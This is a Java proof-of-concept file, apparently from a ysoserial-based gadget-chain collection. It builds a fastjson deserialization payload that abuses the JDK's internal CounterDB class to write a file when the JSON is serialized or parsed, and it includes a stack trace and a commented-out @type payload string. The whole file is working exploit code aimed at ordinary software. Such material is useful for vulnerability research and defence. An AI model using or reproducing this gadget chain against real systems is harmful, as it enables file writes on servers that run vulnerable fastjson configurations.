package ysoserial.payloads.tabbyGadgetChains.Jdk8;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.serializer.SerializerFeature;
import org.springframework.aop.target.PrototypeTargetSource;
import ysoserial.payloads.util.Reflections;

import java.io.File;
import java.lang.reflect.Constructor;

/**
 * <init>:243, ObjectOutputStream (java.io)
 * writeCounter:234, CounterDB (com.sun.corba.se.impl.naming.pcosnaming)
 * getNextCounter:247, CounterDB (com.sun.corba.se.impl.naming.pcosnaming)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * get:451, FieldInfo (com.alibaba.fastjson.util)
 * getPropertyValue:105, FieldSerializer (com.alibaba.fastjson.serializer)
 * write:196, JavaBeanSerializer (com.alibaba.fastjson.serializer)
 * write:275, JSONSerializer (com.alibaba.fastjson.serializer)
 * toJSONString:559, JSON (com.alibaba.fastjson)
 * toJSONString:548, JSON (com.alibaba.fastjson)
 * main:50, Poc2 (ysoserial.payloads.tabbyGadgetChains.Jdk8)
 */

public class Poc2 {
    public static void main(String[] args) throws Exception {
        PrototypeTargetSource x = new PrototypeTargetSource();



//
//
        Class clazz2 = Class.forName("com.sun.corba.se.impl.naming.pcosnaming.CounterDB");
        Constructor xNodeSet = clazz2.getDeclaredConstructor(File.class);
        xNodeSet.setAccessible(true);
        Object xxNodeSet = xNodeSet.newInstance(new File("/tmp/test/counterFile"));

        Reflections.setDeclaredField(xxNodeSet, "counterFile", new File("/tmp/test/counterFile"));
        String json = JSON.toJSONString(xxNodeSet, SerializerFeature.WriteClassName);

        System.out.println(json);
//        String exp = "{\"@type\":\"com.sun.corba.se.impl.naming.pcosnaming.CounterDB\",\"nextCounter\":1}";
        JSON.parseObject(json, Feature.SupportNonPublicField);
//        System.out.println(p);
    }
}
